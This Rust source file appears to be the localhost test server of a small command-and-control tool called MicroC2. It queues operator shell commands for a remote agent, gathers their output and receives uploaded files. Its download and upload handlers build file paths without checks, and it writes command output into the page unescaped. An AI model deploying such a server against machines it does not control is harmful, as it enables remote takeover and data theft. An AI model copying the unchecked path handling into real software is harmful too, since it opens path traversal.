use hyper::{Body, Method, Request, Response, Server, StatusCode};
use hyper::service::{make_service_fn, service_fn};
use std::convert::Infallible;
use std::path::Path;
use std::fs;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use std::sync::Arc;
use tokio::sync::Mutex;
use std::collections::VecDeque;
use once_cell::sync::Lazy;
use serde_json;
use serde::Serialize;

#[derive(Serialize)]
struct CommandResult {
    command: String,
    output: String,
    timestamp: String,
}

// Add command queue type
type CommandQueue = Arc<Mutex<VecDeque<String>>>;
type CommandResults = Arc<Mutex<VecDeque<CommandResult>>>;

// Add global command queues
static COMMANDS: Lazy<CommandQueue> = Lazy::new(|| Arc::new(Mutex::new(VecDeque::new())));
static RESULTS: Lazy<CommandResults> = Lazy::new(|| Arc::new(Mutex::new(VecDeque::new())));

const UPLOAD_DIR: &str = "uploads";

fn generate_file_list_html() -> String {
    let mut html = String::from(r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>MicroC2 Test Server</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .file { padding: 10px; border-bottom: 1px solid #eee; }
                .file:hover { background: #f5f5f5; }
                .download-link { float: right; }
                #command-section { margin-top: 30px; padding: 20px; background: #f8f8f8; border-radius: 5px; }
                #command-input { width: 80%; padding: 10px; }
                #command-output { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; min-height: 200px; }
                .command-entry { margin: 5px 0; }
                .command { color: #0f0; }
                .result { color: #aaa; margin-left: 20px; }
                .command-result { 
                    background: #1a1a1a;
                    color: #0f0;
                    padding: 10px;
                    margin: 10px 0;
                    border-radius: 4px;
                    font-family: monospace;
                    white-space: pre-wrap;
                }
                .timestamp {
                    color: #888;
                    font-size: 0.8em;
                }
            </style>
        </head>
        <body>
            <h1>MicroC2 Test Server</h1>
            
            <div id="command-section">
                <h2>Command Shell</h2>
                <input type="text" id="command-input" placeholder="Enter command...">
                <button onclick="sendCommand()">Send</button>
                <div id="command-output"></div>
            </div>

            <h2>Uploaded Files:</h2>
    "#);

    if let Ok(entries) = std::fs::read_dir(UPLOAD_DIR) {
        for entry in entries {
            if let Ok(entry) = entry {
                if let Ok(filename) = entry.file_name().into_string() {
                    html.push_str(&format!(r#"
                        <div class="file">
                            {} 
                            <a class="download-link" href="/download/{}">Download</a>
                        </div>
                    "#, filename, filename));
                }
            }
        }
    }

    // Add JavaScript for command handling
    html.push_str(r#"
        <script>
        async function sendCommand() {
            const input = document.getElementById('command-input');
            const cmd = input.value;
            input.value = '';

            try {
                // Queue command
                await fetch('/queue_command', {
                    method: 'POST',
                    body: cmd
                });

                // Wait briefly and check for result
                await new Promise(r => setTimeout(r, 1000));
                
                const output = document.getElementById('command-output');
                const cmdDiv = document.createElement('div');
                cmdDiv.className = 'command-entry';
                cmdDiv.innerHTML = `<span class="command">> ${cmd}</span>`;
                output.appendChild(cmdDiv);

                // Keep checking for new results
                checkResults();
            } catch (e) {
                console.error('Error:', e);
            }
        }

        async function checkResults() {
            try {
                const response = await fetch('/get_results');
                const results = await response.json();
                const output = document.getElementById('command-output');
                
                results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = 'command-result';
                    div.innerHTML = `
                        <span class="timestamp">[${result.timestamp}]</span>
                        <span class="command">${result.command}</span>
                        <pre>${result.output}</pre>
                    `;
                    output.appendChild(div);
                });
            } catch (e) {
                console.error('Error fetching results:', e);
            }
        }

        // Poll for results every second
        setInterval(checkResults, 1000);
        </script>
    </body></html>"#);

    html
}

async fn handle_request(req: Request<Body>) -> Result<Response<Body>, Infallible> {
    match (req.method(), req.uri().path()) {
        (&Method::GET, "/") => {
            Ok(Response::new(Body::from(generate_file_list_html())))
        },
        (&Method::POST, "/upload") => {
            handle_upload(req).await
        }
        (&Method::GET, path) if path.starts_with("/download/") => {
            handle_download(path).await
        },
        (&Method::GET, "/get_command") => {
            let mut queue = COMMANDS.lock().await;
            if let Some(cmd) = queue.pop_front() {
                Ok(Response::new(Body::from(cmd)))
            } else {
                Ok(Response::builder()
                    .status(StatusCode::NO_CONTENT)
                    .body(Body::empty())
                    .unwrap())
            }
        },
        (&Method::POST, "/submit_result") => {
            let cmd = req.headers()
                .get("X-Command")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("unknown")
                .to_string();
            
            let body_bytes = hyper::body::to_bytes(req.into_body()).await.unwrap();
            let output = String::from_utf8_lossy(&body_bytes).to_string();
            
            let result = CommandResult {
                command: cmd,
                output,
                timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
            };
            
            RESULTS.lock().await.push_back(result);
            
            Ok(Response::new(Body::from("Result received")))
        },
        (&Method::POST, "/queue_command") => {
            let body_bytes = hyper::body::to_bytes(req.into_body()).await.unwrap();
            let command = String::from_utf8_lossy(&body_bytes);
            COMMANDS.lock().await.push_back(command.to_string());
            Ok(Response::new(Body::from("Command queued")))
        },
        (&Method::GET, "/get_results") => {
            let mut results = RESULTS.lock().await;
            let collected: Vec<CommandResult> = results.drain(..).collect();
            let json = serde_json::to_string(&collected)
                .unwrap_or_else(|_| "[]".to_string());
            Ok(Response::builder()
                .header("Content-Type", "application/json")
                .body(Body::from(json))
                .unwrap())
        },
        _ => {
            Ok(Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(Body::from("404 Not Found"))
                .unwrap())
        }
    }
}

async fn handle_upload(req: Request<Body>) -> Result<Response<Body>, Infallible> {
    if !Path::new(UPLOAD_DIR).exists() {
        fs::create_dir_all(UPLOAD_DIR).unwrap();
    }

    // Extract filename from headers before consuming the request
    let filename = if let Some(name) = req.headers().get("X-Filename") {
        format!("{}/{}_{}", UPLOAD_DIR,
            chrono::Local::now().format("%Y%m%d_%H%M%S"),
            name.to_str().unwrap_or("uploaded_file"))
    } else {
        format!("{}/uploaded_file_{}", UPLOAD_DIR,
            chrono::Local::now().format("%Y%m%d_%H%M%S"))
    };

    // Now consume the request body
    let body_bytes = hyper::body::to_bytes(req.into_body())
        .await
        .unwrap();

    let mut file = File::create(&filename).await.unwrap();
    file.write_all(&body_bytes).await.unwrap();

    Ok(Response::new(Body::from(format!("File uploaded as: {}", 
        Path::new(&filename).file_name().unwrap().to_string_lossy()))))
}

async fn handle_download(path: &str) -> Result<Response<Body>, Infallible> {
    let filename = path.strip_prefix("/download/").unwrap();
    let filepath = format!("{}/{}", UPLOAD_DIR, filename);

    match fs::read(&filepath) {
        Ok(contents) => Ok(Response::new(Body::from(contents))),
        Err(_) => Ok(Response::builder()
            .status(StatusCode::NOT_FOUND)
            .body(Body::from("File not found"))
            .unwrap())
    }
}

pub async fn run_test_server() {
    let addr = ([127, 0, 0, 1], 8080).into();

    let make_svc = make_service_fn(|_conn| async {
        Ok::<_, Infallible>(service_fn(handle_request))
    });

    let server = Server::bind(&addr).serve(make_svc);

    println!("Test server running on http://{}", addr);

    if let Err(e) = server.await {
        eprintln!("Server error: {}", e);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_server() {
        run_test_server().await;
    }
}